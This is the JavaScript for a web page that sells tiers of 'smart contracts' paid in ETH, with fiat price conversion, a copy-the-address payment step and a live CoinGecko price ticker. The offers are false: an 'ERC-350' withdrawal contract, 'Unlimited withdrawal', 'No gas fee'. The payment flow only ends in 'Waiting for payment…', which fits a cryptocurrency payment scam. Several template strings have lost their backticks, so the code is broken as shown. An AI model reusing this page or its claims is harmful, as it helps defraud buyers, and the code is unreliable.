let currentStep = 1;
let selectedContractType = '';
let selectedTier = '';
let selectedETH = 0;

const rates = {
  USD: 2642.79,
  CAD: 3625.66,
  EUR: 2325.86,
};

function showStep(n) {
  document.querySelectorAll('.step').forEach((step, i) => {
    step.classList.remove('active');
    if (i === n - 1) step.classList.add('active');
  });
}

function nextStep() {
  if (currentStep === 1) {
    selectedContractType = document.getElementById('contract-type').value;
    generateOptions(selectedContractType);
  }
  currentStep++;
  showStep(currentStep);
}

function prevStep() {
  currentStep--;
  showStep(currentStep);
}

function generateOptions(type) {
  const container = document.getElementById('options-container');
  container.innerHTML = '';

  const options = {
    "Token Contract (ERC-20)": [
      { name: "Normal", eth: 1.5, desc: "Basic transfer functionality\nLimited customization\nStandard gas fees apply" },
      { name: "Medium", eth: 2.1, desc: "Optimized transfer & basic airdrop capability\nReduced gas costs\nModerate customization" },
      { name: "Trader", eth: 3.4, desc: "Unlimited withdrawal\nNo gas fee\nAuto-market integration" }
    ],
    "Withdrawal Contract (ERC-350)": [
      { name: "Normal", eth: 0.6, desc: "Simple one-time withdrawal\nBasic security" },
      { name: "Medium", eth: 1.0, desc: "Scheduled withdrawals\nCustom token support" },
      { name: "Expert", eth: 3.4, desc: "High-value transfers\nGasless bulk withdrawals" }
    ],
    // Add other contract types here...
  };

  const selectedOptions = options[type];
  selectedOptions.forEach(opt => {
    const box = document.createElement('div');
    box.className = 'option-box';
    box.innerHTML = 
      <h3>${opt.name} – ${opt.eth} ETH (<span class="converted-price">${convertETH(opt.eth)}</span>)</h3>
      <p>${opt.desc.replace(/\n/g, '<br>')}</p>
      <button onclick="selectTier('${opt.name}', ${opt.eth})">Choose</button>
    ;
    container.appendChild(box);
  });
}

function selectTier(tier, eth) {
  selectedTier = tier;
  selectedETH = eth;
  document.getElementById('contract-summary').textContent = ${selectedContractType} – ${selectedTier};
  document.getElementById('eth-amount').textContent = selectedETH;
  nextStep();
}

function convertETH(eth) {
  const currency = document.getElementById('currency').value;
  const rate = rates[currency];
  return ${(eth * rate).toFixed(2)} ${currency};
}

function updatePrices() {
  document.querySelectorAll('.converted-price').forEach((el, i) => {
    const eth = parseFloat(el.parentElement.textContent.split('–')[1].split('ETH')[0].trim());
    el.textContent = convertETH(eth);
  });
}

function copyAddress() {
  const addr = document.getElementById('eth-address').textContent;
  navigator.clipboard.writeText(addr);
  alert('Address copied to clipboard!');
}

function simulateLoading() {
  document.querySelector('.loading').textContent = 'Waiting for payment…';
  nextStep(); // Move to payment step
}




async function updateLiveCryptoPrices() {
  const apiUrl = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,ripple,solana&vs_currencies=usd';

  try {
    const response = await fetch(apiUrl);
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    const data = await response.json();

    const priceContainer = document.getElementById('cryptoPrices');
    priceContainer.innerHTML = ''; // Clear previous content

    const prices = {
      BTC: data.bitcoin.usd,
      ETH: data.ethereum.usd,
      XRP: data.ripple.usd,
      SOL: data.solana.usd
    };

    Object.entries(prices).forEach(([symbol, value]) => {
      const span = document.createElement('span');
      span.textContent = ${symbol}: $${value.toLocaleString()};
      span.classList.add('updated');
      priceContainer.appendChild(span);

      // Remove animation class after glow completes
      setTimeout(() => span.classList.remove('updated'), 1000);
    });
  } catch (error) {
    console.error('Error fetching live crypto prices:', error);
  }
}

// Initial load
updateLiveCryptoPrices();

// Update every 10 seconds
setInterval(updateLiveCryptoPrices, 10000);
